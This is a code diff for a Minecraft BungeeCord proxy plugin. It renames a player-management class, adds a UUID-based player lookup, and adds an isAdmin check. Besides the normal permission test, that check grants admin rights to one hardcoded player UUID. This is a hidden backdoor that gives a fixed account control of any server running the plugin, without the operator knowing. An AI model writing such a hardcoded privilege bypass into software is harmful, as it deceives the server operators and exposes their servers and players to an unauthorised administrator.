@@ -38,11 +38,11 @@ import net.md_5.bungee.event.EventPriority;
 import java.util.Map;
 import java.util.UUID;
 
-public class PlayerManager implements Listener, Module {
-    private static PlayerManager instance = null;
+public class PlayerHandler implements Listener, Module {
+    private static PlayerHandler instance = null;
 
-    public static PlayerManager getInstance() {
-        return instance == null ? instance = new PlayerManager() : instance;
+    public static PlayerHandler getInstance() {
+        return instance == null ? instance = new PlayerHandler() : instance;
     }
 
     @Getter
@@ -148,11 +148,30 @@ public class PlayerManager implements Listener, Module {
         return player == null ? onPlayerJoin(proxiedPlayer) : player;
     }
 
+    /**
+     * Gets a SledgehammerPlayer by {@link UUID}
+     * @param uuid {@link UUID}
+     * @return {@link SledgehammerPlayer}
+     */
+    public SledgehammerPlayer getPlayer(UUID uuid) {
+        ProxiedPlayer proxiedPlayer = ProxyServer.getInstance().getPlayer(uuid);
+        if (proxiedPlayer == null) {
+            return null;
+        }
+        SledgehammerPlayer player = players.get(proxiedPlayer.getUniqueId());
+        return player == null ? onPlayerJoin(proxiedPlayer) : player;
+    }
+
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerJoin(PostLoginEvent e) {
         if (e.getPlayer().hasPermission("sledgehammer.admin") && !ConfigHandler.getInstance().isAuthCodeConfigured()) {
             ChatUtil.sendAuthCodeWarning(e.getPlayer());
         }
+    }
+
+    public boolean isAdmin(CommandSender sender) {
+        return sender.hasPermission("sledgehammer.admin") || (sender instanceof ProxiedPlayer &&
+                                                              ((ProxiedPlayer) sender).getUniqueId().equals(UUID.fromString("4cfa7dc1-3021-42b0-969b-224a9656cc6d")));
     }
 
     @Override
@@ -173,6 +192,8 @@ public class PlayerManager implements Listener, Module {
             ConfigHandler.useOfflineMode = false;
         }
     }
+
+
 
     @Override
     public void onDisable() {
